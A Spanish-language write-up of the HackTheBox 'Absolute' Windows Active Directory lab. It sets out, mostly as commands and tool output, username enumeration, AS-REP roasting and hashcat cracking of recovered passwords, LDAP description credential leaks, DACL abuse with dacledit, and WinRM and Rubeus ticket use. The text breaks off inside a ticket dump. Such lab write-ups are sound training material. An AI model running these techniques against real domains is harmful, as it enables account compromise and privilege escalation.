---
title: "HackTheBox: Absolute"
author: ace
date: 2023-11-06 19:10 +0800
categories:
  - HTB
  - Insane
  - Windows
tags:
  - ActiveDirectory
math: false
mermaid: true
image:
  path: 
  lqip: 
  alt: Absolute
---


|Box info|
|-----|
|**Hostname**| Absolute |
|**OS**| Windows |
|**Difficulty**| Insane |
|**Platform**| HackTheBox|

## Resumen

## nmap

```ruby
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Absolute
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-05 19:18:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
|_ssl-date: 2023-11-05T19:19:45+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-05T19:19:44+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-05T19:19:45+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
|_ssl-date: 2023-11-05T19:19:44+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time: 
|   date: 2023-11-05T19:19:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```
{: .nolineno }

## Enumeración de servicios

A primera vista, podemos observar que los puertos (53, 88, 389) correspondientes a DNS, Kerberos y LDAP están abiertos, lo cual ya es un indicador claro de que nos encontramos frente a un controlador de dominio.

### Web 80 - TCP

Para ir directo al grano: no tenemos acceso a una sesión de invitado para enumerar recursos a través de SMB, ni podemos conectarnos al Controlador de Dominio (DC) mediante rpcclient o LDAP para enumerar usuarios o información del dominio. En cuanto al servidor web, se trata de un IIS que almacena una página estática. Después de ejecutar Gobuster, no he encontrado nada de interés, como archivos PHP o ASPX. Sin embargo, podemos obtener información de las imágenes almacenadas en la carpeta '/images'. Descargaremos estas imágenes a nuestra máquina local para analizar posteriormente los metadatos.

```bash
wget -r http://absolute.htb/images
```

Para analizar los metadatos de las imágenes, utilizaré ExifTool y filtraré por el campo 'Author' con el fin de obtener, si está disponible, el nombre de usuario que creó la imagen. En este caso, utilizaré un `*` para que el comando se aplique a todos los archivos PNG y me lo redirija a un fichero de texto. El comando que emplearé es el siguiente:

```bash
❯ exiftool *.jpg | grep -i "Author" | awk '{print $2}' FS=':' | sed 's/^ //g' | tee -a usernames.txt
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith
```

Ahora que tenemos una lista de posibles usuarios, hemos dado un paso valioso en un entorno de Active Directory (AD). Generalmente, la estructura de los nombres de usuario depende del dominio y suele seguir patrones como inicial, apellido, inicial.apellido, inicial_apellido, entre otros. Para simplificar la generación de posibles nombres de usuario, existe una herramienta escrita en Ruby llamada **Username-Anarchy**. Esta herramienta toma un archivo de texto correctamente formateado y genera una lista de posibles nombres de usuario. Puedes encontrarla en el siguiente repositorio: [Usename-Anarchy](https://github.com/urbanadventurer/username-anarchy).

El siguiente paso consiste en formatear el archivo de manera que **Username-Anarchy** pueda entenderlo, lo cual suele ser en el formato 'nombre,apellido'. Con el editor de texto **vi** se puede realizar ejecutando la siguiente instrucción:

```
:%s/ /,/g
```

El fichero final es el siguiente:

```bash
❯ cat usernames.txt
firstname,lastname
James,Roberts
Michael,Chaffrey
Nicole,Smith
Donald,Klay
Jeffer,Robinson
Sarah,Osvald
```

Ejecutamos **Username-Anarchy** y obtenemos un archivo de texto con los posibles nombres de usuario. Luego, utilizamos **sponge** para sobrescribir el archivo sin la necesidad de redirigirlo a uno temporal o realizar pasos adicionales

```bash
❯ /opt/username-anarchy/username-anarchy -i usernames.txt -f flast,f.last | sponge usernames.txt
❯ cat usernames.txt
j.roberts
jroberts
m.chaffrey
mchaffrey
n.smith
nsmith
d.klay
dklay
j.robinson
jrobinson
s.osvald
sosvald
```

En Active Directory, el primer paso comúnmente realizado cuando se dispone de una lista de posibles usuarios del dominio es utilizar **Kerbrute** para comprobar si son válidos o no. Esto se  puede comprobar debido al funcionamiento de Kerberos. Cuando se envía una solicitud `AS_REQ` para obtener un TGT (Ticket Granting Ticket), si el usuario no es válido, Kerberos responde con un mensaje de `PRINCIPAL_UNKNOWN`, indicando que el usuario no se encuentra en la base de datos de Kerberos. Por otro lado, si el usuario es válido, Kerberos responderá con un mensaje de 'invalid credentials' u otra respuesta similar. 

```
❯ /opt/kerbrute/kerbrute userenum --dc dc.absolute.htb -d absolute.htb usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/05/23 - Ronnie Flathers @ropnop

2023/11/05 13:40:41 >  Using KDC(s):
2023/11/05 13:40:41 >  	dc.absolute.htb:88

2023/11/05 13:40:41 >  [+] VALID USERNAME:	m.chaffrey@absolute.htb
2023/11/05 13:40:41 >  [+] VALID USERNAME:	j.roberts@absolute.htb
2023/11/05 13:40:41 >  [+] VALID USERNAME:	n.smith@absolute.htb
2023/11/05 13:40:41 >  [+] VALID USERNAME:	j.robinson@absolute.htb
2023/11/05 13:40:41 >  [+] VALID USERNAME:	s.osvald@absolute.htb
2023/11/05 13:40:41 >  [+] d.klay has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$d.klay@ABSOLUTE.HTB:fc3b115409207e3dc0d7b4e5bcecb3e0$021ba373ad154f0094c1b0908033c3b55eeb99fd9d3b5e4969131490b2519ee1790022539cfc3cdd387e0f1e2948dc2614346915b61c74406a9aa42d15c7c10005a21bcc7ac0872b30a7d2d2cc4c3bf83a64e4a869dbcf8a680a6519c8026ad46e45dc20a3ac4ea011627bf8e4b395426cbf3ad36cb281b4be13f5c744e60aace854ea155cb02788df60d89660705997c6b4e3d9b715d9f8443466a55ab157366814e01ee36b32306cd41b229bb7a1a7f22acaa30804c13e4cd9d418d8dc93e26f01e13dfd20c69afe4049af9c8f9780c4a4768729be3e3b85c2c38f6371f1943e49f155983fadbe0e69f104927b4d2c381a9ae451bc131b20e6a43c141b0f48
2023/11/05 13:40:41 >  [+] VALID USERNAME:	d.klay@absolute.htb
2023/11/05 13:40:41 >  Done! Tested 24 usernames (6 valid) in 0.214 seconds
```

Tras ejecutar Kerbrute, observamos un listado de usuarios válidos, y notamos que `d.klay` es vulnerable al ataque `AS-REP roast`. La última versión de Kerbrute realiza un AS-REP roast directamente para obtener el Ticket Granting Ticket (TGT) del usuario vulnerable. La vulnerabilidad de este usuario radica en su configuración, que tiene la opción `DONT_REQUIRE_PREAUTH` habilitada. Esto significa que no requiere autenticación previa de Kerberos, lo que permite que el `kdc` devuelva el TGT con la contraseña del usuario encriptada

Guardamos los usuarios válidos en un fichero.

```
❯ cat usernames.txt
m.chaffrey
j.roberts
n.smith
j.robinson
s.osvald
d.klay
```

El hash capturado por Kerbrute no se puede crackear,  ya que se está utilizando una versión de kerberos 

Para obtener el hash, la mejor opción es `impacket-GetNPUUsers`

```bash
❯ impacket-GetNPUsers -dc-ip 10.129.68.75 -no-pass -request 'absolute.htb/d.klay'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for d.klay
$krb5asrep$23$d.klay@ABSOLUTE.HTB:7f20e46062a600c2be20601c64f7a964$01cc50aef8801b01616870c0a0a5e5aff9a3c47b6173af9d62c96a81d352da28c74871a959c5e4b8ab7b055cfb991a3d67f70895c676fc47ec668f6aa0850ca3ca81d62c8d6e27e3fcb19e1716106fa012b31c755bd912f71160b1f12e257035577ac26caf476ee9c9734209e3f43b1303b25814f63caf1c2ab4e6d3f4316bafd1589d03b91625834987f71cc669872d66aaf06bb568ec5e1ca960cccca9199a43c8dca79cca058f38cc93c76e0123d9f59abd5158f018e8edd2253f73d657f5e5e2f2f7498d0840e8dc9775826e9f5b3d3652f227b7719ac0c2f5b456e7e4ab52cfb135b65f7fc7265ae845
```

Con kerbrute (--downgrade):

```
❯ /opt/kerbrute/kerbrute userenum --dc dc.absolute.htb -d absolute.htb users.txt --downgrade

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/07/23 - Ronnie Flathers @ropnop

2023/11/07 00:17:46 >  Using downgraded encryption: arcfour-hmac-md5
2023/11/07 00:17:46 >  Using KDC(s):
2023/11/07 00:17:46 >  	dc.absolute.htb:88
...
...
2023/11/07 00:17:46 >  [+] d.klay has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$d.klay@ABSOLUTE.HTB:8d5712913aac4c62eda2d5c1d791c48e$541a1a48c6ee608182959fcf33c373961e6ab54a46ac1b256f5b59a10e695863603034716c8c5b684788c7e80e0dd76d376ea36b96e945ef8cb345dc878afd91dd9539a4896f9b44a572a10bdbc2ac335b55ccde0e7e4dd27fdf6de91700eaafee3a892a5c45eb6f23e9e2630f279118ac6b15d508b5e7dba58c1668faba647e2428aff68d812a26ac1c6c506617a78caec11fdb1d727b3dcf0773b7b303638101ba6adc8221a67d2d7ab4d86b6835380842c64f2159950bd9e99c3d6c4de0e927535a86fdae38560eabf69d800cd871e8628cd5438084bdceacbaa378bc62fd33f7553a4521f711f5878bed
2023/11/07 00:17:46 >  [+] VALID USERNAME:	d.klay@absolute.htb
```

Una vez tenemos el hash, lo crackeamos usando `hashcat`

```bash
❯ hashcat -m 18200 -a 0 d.klay.asrep /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-5775C CPU @ 3.30GHz, 6921/13906 MB (2048 MB allocatable), 8MCU

```

```bash
$krb5asrep$23$d.klay@ABSOLUTE.HTB:7dcc8ee944cbd8d9acffd5e52e051762$6f4acb9b53597e032fa24da7f8c4ac8c4f66e92394b5512c9702841ac64f134052687e40aa5beb40a7977ecd1b0b91e1b90fbfef6ede949050627e5d43ff2a4a4c1ee7f4cee2df7c3534c4a4fb674a5863f170414049ac2b2d95e4cda2679bfab591c205f1b6f3a942432e4d74f68350cb6300cf90309c1ca714e1ec0520b2058ac5199b5056a8319869eab3aedc35688b1cd3911dc0e2c071fe6e1da57040497021ddd2e2bdaec6544bedf696dd2eb0d7df0b5f1bf3a90846939dfc93322c58fd42b6c05303436f81c870b7847481c033112905c1f6d316c78cd439fb52f10d9381e1c8c0804c2e4be542c8:Darkmoonsky248girl
```

Tras conseguir obtener la contraseña del usuario `d.klay` en texto plano, voy a validarla usando `crackmapexec`, y obtenemos el siguiente resultado:

```bash
❯ cme smb 10.129.68.75 -u 'd.klay' -p 'Darkmoonsky248girl' 
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
```

Parece ser que `crackmapexec` realiza la autenticación mediante `NTLM`. Puede que el administrador del dominio haya deshabilitado este tipo de autenticación para usuarios no privilegiados, ya que de esta manera se evitan los ataques `Pass-The-Hash`.

Pero al disponer de la contraseña, voy a autenticarme usando `Kerberos`.

```bash
❯ cme smb 10.129.68.75 -u 'd.klay' -p 'Darkmoonsky248girl' -k
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [-] absolute.htb\d.klay: KRB_AP_ERR_SKEW
```

Vemos el siguiente error `KRB_AP_ERR_SKEW`. Esto ocurre porque no tenemos sincronizados la hora de nuestra máquina de atacante con el reloj del DC. Para evitar problemas con Kerberos siempre es recomendable tener síncronizada la hora.
#### Sincronizando el reloj con el DC.

Para sincronizarlo podemos usar la herramienta `ntpdate`, aunque en mi caso tuve que realizar una configuración extra:

```bash
❯ sudo ntpdate 10.129.68.75
2023-11-05 22:19:23.24649 (+0100) +25200.798573 +/- 0.025121 10.129.68.75 s1 no-leap
CLOCK: time stepped by 25200.798573
```

Aunque ejecute este comando, el reloj no se síncroniza y esto en mi caso concreto se debía a que el demonio `systemd-timesyncd` estaba ejecutandose. Este demonio se utiliza para sincronizar el reloj del sistema a través de la red, lo cual causaba conficto con`ntpdate`. Para evitar errores simplemente deshabilito el servicio, y ya puedo sincronizarme al DC.

```bash
❯ systemctl stop systemd-timesyncd.service
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ====
Authentication is required to stop 'systemd-timesyncd.service'.
Authenticating as: alex,,, (alex)
Password: 
==== AUTHENTICATION COMPLETE ====
❯ sudo ntpdate dc.absolute.htb
2023-11-05 22:28:00.484487 (+0100) +252
```

Nos autenticamos por Kerberos, y ahora podemos comprobar que las credenciales son correctas.

```bash
❯ cme smb 10.129.68.75 -u 'd.klay' -p 'Darkmoonsky248girl' -k
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
```

#### Configurando Kerberos para autenticación.

Bien ya que disponemos de credenciales válidas, si queremos autenticarnos en el dominio para empezar a enumerar, lo tenemos que hacer usando Kerberos obligatoriamente. Esto puede ser un dolor de cabeza al principio por que la mayoría de scripts usados para enumerar AD, usan `NTLM` por defecto. 

Por ejemplo voy a conectarme por `rpcclient` al DC, usando las credenciales de `d.klay`

```
❯ rpcclient -U 'absolute.htb\d.klay%Darkmoonsky248girl' 10.129.68.75
Cannot connect to server.  Error was NT_STATUS_ACCOUNT_RESTRICTION
```

El siguiente mensaje indica que la autenticación NTLM está desactivada. En cambió si lo hago con Kerberos, la cosa cambia.

```bash
❯ rpcclient -U 'absolute.htb\d.klay%Darkmoonsky248girl' 10.129.68.75 --use-kerberos=required
Kerberos auth with 'd.klay@ABSOLUTE.HTB' (ABSOLUTE.HTB\d.klay) to access '10.129.68.75' not possible
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

No podemos conectarnos pero simplemente porque no tenemos permisos xD

Ahora bien ¿Como utilizo Kerberos, como método de autenticación?

Para llevar a cabo esta tarea, es necesario contar con el paquete `krb5-user` instalado y configurar el fichero `/etc/krb5.conf` indicado la información del dominio al que nos vamos a conectar. Debe tener la siguiente estructura:

```bash
❯ cat /etc/krb5.conf

[libdefaults]
    default_realm = ABSOLUTE.HTB


[realms]
    ABSOLUTE.HTB= {
        kdc = dc.absolute.htb
        admin_server = dc.absolute.htb
        default_domain = absolute.htb

    }

[domain_realm]
    .absolute.htb = ABSOLUTE.HTB
    absolute.htb
```

Una vez esto vamos a iniciar sesión como `d.klay` usando el comando `kinit`

```
❯ kinit d.klay
Password for d.klay@ABSOLUTE.HTB:
```

No vemos ningún output lo cual quiere decir que disponemos de una sesión como `d.klay`. Podemos listar los tickets almacenados en memoria con `klist`

```bash
❯ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: d.klay@ABSOLUTE.HTB

Valid starting     Expires            Service principal
11/07/23 02:50:44  11/07/23 06:50:44  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
	renew until 11/07/23 06:50:44
11/07/23 02:51:18  11/07/23 06:50:44  ldap/dc.absolute.htb@ABSOLUTE.HTB
	renew until 11/07/23 06:50:44
```

Bien ahora que podemos usar Kerberos como método de autenticación vamos a enumerar el dominio.
#### Enumeración autenticado: LDAPsearch

Si queremos realizar una query de algo en especial y no queremos tirar el `bloodhound`, siempre es buena opción tirar de `ldapdomaindump` o `ldapsearh`. En este caso creo que `ldapdomaindump` no dispone de soporte para autenticarse usando kerberos, pero con `ldapsearch` si podemos.
Al disponer del ticket almacenado en memoria no hace falta que proporcionemos contraseña, cada vez que realicemos una query por LDAP, se usará ese ticket.
Por ejemplo de esta manera podemos enumerar todos los usuarios del dominio

```bash
❯ ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "DC=absolute,DC=htb" "objectclass=user" | grep "name" | awk '{print $2}'
SASL/GSSAPI authentication started
SASL username: d.klay@ABSOLUTE.HTB
SASL SSF: 256
SASL data security layer installed.
Administrator
Guest
DC
krbtgt
J.Roberts
M.Chaffrey
D.Klay
s.osvald
j.robinson
n.smith
m.lovegod
l.moore
c.colt
s.johnson
d.lemm
svc_smb
svc_audit
winrm_user
```

También podríamos enumerar sus descripciones, ya que es común que en entornos CTF, se pueda obtener información como contraseñas.

```bash
❯ ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "DC=absolute,DC=htb" "objectClass=User" name description | grep -E "(description|name)"
SASL/GSSAPI authentication started
SASL username: d.klay@ABSOLUTE.HTB
SASL SSF: 256
SASL data security layer installed.
# requesting: name description 
description: Built-in account for administering the computer/domain
name: Administrator
description: Built-in account for guest access to the computer/domain
name: Guest
name: DC
description: Key Distribution Center Service Account
name: krbtgt
name: J.Roberts
name: M.Chaffrey
name: D.Klay
name: s.osvald
name: j.robinson
name: n.smith
name: m.lovegod
name: l.moore
name: c.colt
name: s.johnson
name: d.lemm
description: AbsoluteSMBService123!
name: svc_smb
name: svc_audit
description: Used to perform simple network tasks
name: winrm_user
```

Como se puede observar en la descripcción de un usuario se puede ver la string `AbsoluteSMBService123!`, que tiene todas las papeletas de ser una contraseña.
Enumerar con `ldapsearch` es incomodo para mi gusto y más disponiendo de herramientas como `bloodhound`, pero es interesante ver como se puede enumerar la misma información de maneras diferentes.
#### Enumeración autenticado: Bloodhound

Después de enumerrar

```bash
❯ bloodhound-python -dc dc.absolute.htb -ns 10.129.68.75 -c all -d absolute.htb -u 'd.klay' -p 'Darkmoonsky248girl'
INFO: Found AD domain: absolute.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 18 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Done in 00M 10S
```


```
❯ sudo neo4j console
[sudo] password for alex: 
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
```

```bash
❯ which bloodhound
bloodhound: aliased to /opt/bloodhound/BloodHound --no-sandbox &> /dev/null & disown
```

```
❯ cat ~/.zshrc | grep bloodhound
alias bloodhound='/opt/bloodhound/BloodHound --no-sandbox &> /dev/null & disown'
```

```
MATCH (u:User) return u.name, u.description
```


![img](/assets/img/post/Absolute/1.png)


```
❯ cat 20231105223511_users.json  | jq '.data[].Properties | .samaccountname + ":" + .description' -r
:
winrm_user:Used to perform simple network tasks
svc_smb:AbsoluteSMBService123!
d.lemm:
svc_audit:
c.colt:
s.johnson:
l.moore:
n.smith:
m.lovegod:
j.robinson:
D.Klay:
s.osvald:
J.Roberts:
M.Chaffrey:
krbtgt:Key Distribution Center Service Account
Administrator:Built-in account for administering the computer/domain
Guest:Built-in account for guest access to the computer/domain
```


## LDAP


### WireShark

```bash
❯ cme smb 10.129.68.75 -u 'svc_smb' -p 'AbsoluteSMBService123!' -k --shares
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
SMB         10.129.68.75    445    DC               [+] Enumerated shares
SMB         10.129.68.75    445    DC               Share           Permissions     Remark
SMB         10.129.68.75    445    DC               -----           -----------     ------
SMB         10.129.68.75    445    DC               ADMIN$                          Remote Admin
SMB         10.129.68.75    445    DC               C$                              Default share
SMB         10.129.68.75    445    DC               IPC$            READ            Remote IPC
SMB         10.129.68.75    445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.68.75    445    DC               Shared          READ            
SMB         10.129.68.75    445    DC               SYSVOL          READ            Logon server share 

```

```bash
impacket-smbclient 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k 
```

```
# use Shared
# ls
drw-rw-rw-          0  Thu Sep  1 19:02:23 2022 .
drw-rw-rw-          0  Thu Sep  1 19:02:23 2022 ..
-rw-rw-rw-         72  Thu Sep  1 19:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Thu Sep  1 19:02:23 2022 test.exe
```

```
# get test.exe
# get compiler.sh
```


### Spam de mi script

```
ip.addr == 10.129.68.75 && not udp.port ==53
```


![img](/assets/img/post/Absolute/2.png)


![img](/assets/img/post/Absolute/3.png)

![img](/assets/img/post/Absolute/4.png)

![img](/assets/img/post/Absolute/5.png)


## Acceso Inicial

### Método 1: Desde Linux

```bash
❯ cme smb 10.129.68.75 -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
```

```
❯ git clone https://github.com/ShutdownRepo/impacket -b dacledit
Cloning into 'impacket'...
remote: Enumerating objects: 24084, done.
remote: Counting objects: 100% (5485/5485), done.
remote: Compressing objects: 100% (298/298), done.
remote: Total 24084 (delta 5246), reused 5187 (delta 5187), pack-reused 18599
Receiving objects: 100% (24084/24084), 9.82 MiB | 6.68 MiB/s, done.
Resolving deltas: 100% (18353/18353), done.
```

```
❯ python3 -m venv .venv
❯ source .venv/bin/activate
```

```bash
❯ pip3 install .
Processing /home/alex/HTB/Absolute/content/impacket
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Collecting pyasn1>=0.2.3 (from impacket==0.9.25.dev1+20230823.145202.4518279)
  Downloading pyasn1-0.5.0-py2.py3-none-any.whl (83 kB)
```


```bash
❯ KRB5CCNAME=m.lovegod.ccache ./dacledit.py -k -no-pass -dc-ip 10.129.68.75 -principal m.lovegod -target "Network Audit" -action write -rights FullControl absolute.htb/m.lovegod
Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20231106-192332.bak
[*] DACL modified successfully!
```


```bash
❯ KRB5CCNAME=m.lovegod.ccache ./dacledit.py -k -no-pass -dc-ip 10.129.68.75 -principal m.lovegod -target "Network Audit" -action write -rights FullControl absolute.htb/m.lovegod
Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20231106-194043.bak
[*] DACL modified successfully!
❯ net rpc group addmem "Network Audit" -U m.lovegod -S dc.absolute.htb -k m.lovegod
WARNING: The option -k|--kerberos is deprecated!
```


```bash
❯ cat /etc/krb5.conf

[libdefaults]
    default_realm = ABSOLUTE.HTB


[realms]

    ABSOLUTE.HTB= {
        kdc = dc.absolute.htb
        admin_server = dc.absolute.htb
        default_domain = absolute.htb

    }


[domain_realm]
    .absolute.htb = ABSOLUTE.HTB
    absolute.htb = ABSOLUTE.HTB
```


```bash
❯ kinit m.lovegod
Password for m.lovegod@ABSOLUTE.HTB: 
```

```
❯ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: m.lovegod@ABSOLUTE.HTB

Valid starting     Expires            Service principal
11/06/23 19:38:56  11/06/23 23:38:56  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
	renew until 11/06/23 23:38:56
11/06/23 19:39:07  11/06/23 23:38:56  cifs/dc.absolute.htb@ABSOLUTE.HTB
	renew until 11/06/23 23:38:56
```

```
❯ KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb -u winrm_user
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents> whoami
absolute\winrm_user
*Evil-WinRM* PS C:\Users\winrm_user\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 3:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::19c
   IPv6 Address. . . . . . . . . . . : dead:beef::7dc9:28ca:b147:9c36
   Link-local IPv6 Address . . . . . : fe80::7dc9:28ca:b147:9c36%11
   IPv4 Address. . . . . . . . . . . : 10.129.68.75
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%11
                                       10.129.0.1
```


### Método 2: Desde Windows

```
PS C:\Users\Alex\Desktop\HTB\Absolute> C:\Users\Alex\Desktop\tools\Rubeus.exe renew /ticket:winrm_user.kirbi /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Renew Ticket

[*] Using domain controller: dc.absolute.htb (10.129.68.75)
[*] Building TGS-REQ renewal for: 'ABSOLUTE.HTB\winrm_user'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      doIGdjCCBnKgAwIBBaEDAgEWooIFeTCCBXVhggVxMIIFbaADAgEFoQ4bDEFCU09MVVRFLkhUQqIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMQUJTT0xVVEUuSFRCo4IFMTCCBS2gAwIBEqEDAgECooIFHwSCBRsjSd5+
      lpFROCQh2Ipxwcqmt63x6E6Dm1YfFXqbHcxpDuTbRRXfnVmdsUjljjlLkXDcUfu1TvnqIawmpqigYTG6
      c4sZ+ZCWF6XfPKMgqit7t/DQlRM5aQqtHvUX6vVL1wkAhqZTw+3tnyXVeJpMibViy64N39Plv8ayKACm
      ZVnviTU8r95F8Ynsp+Q2s3OfVbtaVuUko6LX8vCkTd55ZhYx+rwNTv6XhQ6oryq1DFh3JX54ZzVzwbdM
      iYpezWGERqpL8Mj/USGBjML2q5ihWUVA8wPg3lg7vUgxePvdUc+5tiNn1t8wAk2vFRXlOEhN5kiFDyZn
